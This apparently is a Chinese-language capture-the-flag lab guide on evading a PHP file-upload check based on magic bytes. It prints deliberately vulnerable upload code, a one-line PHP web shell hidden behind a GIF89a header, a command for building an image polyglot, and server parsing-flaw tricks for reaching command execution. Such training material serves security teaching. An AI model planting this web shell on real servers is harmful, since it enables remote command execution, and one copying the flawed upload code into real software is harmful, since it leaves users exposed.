# 文件头检查绕过

## 概述

服务器检查文件的 magic bytes（文件头）来验证文件类型。可以通过在 PHP 文件开头添加正确的文件头来绕过。

## 漏洞代码

```php
<?php
$finfo = finfo_open(FILEINFO_MIME_TYPE);
$mime = finfo_file($finfo, $_FILES['file']['tmp_name']);

if (strpos($mime, 'image/') !== 0) {
    die('只允许上传图片文件');
}

$ext = strtolower(pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION));
if (!in_array($ext, ['jpg', 'png', 'gif'])) {
    die('扩展名不允许');
}

move_uploaded_file($_FILES['file']['tmp_name'], 'uploads/' . $_FILES['file']['name']);
?>
```

## 绕过方法

### 添加 GIF 文件头

在 PHP 文件开头添加 `GIF89a`：

```
GIF89a
<?php system($_GET['cmd']); ?>
```

### 使用图片马

1. 准备一张正常图片
2. 在图片末尾添加 PHP 代码：

```bash
copy /b image.jpg + shell.php shell.jpg
```

3. 将文件名改为 `shell.php.jpg` 或使用解析漏洞

### 文件头标识

```
JPEG: FF D8 FF E0
PNG:  89 50 4E 47
GIF:  47 49 46 38 (GIF89a)
BMP:  42 4D
```

## 解析漏洞

即使文件是 `.jpg` 扩展名，某些服务器配置可能仍会解析 PHP：

- Apache `.htaccess` 配置
- Nginx 空字节截断
- IIS 分号解析

## 练习步骤

1. 准备带 GIF 文件头的 PHP 文件
2. 上传文件 — 通过文件头检查
3. 如果扩展名被限制，尝试 `.php.jpg` 或解析漏洞
4. 访问上传的文件
5. 执行命令获取 flag

## flag

在 `/flag` 文件中查找 `CR{...}` 格式的 flag。
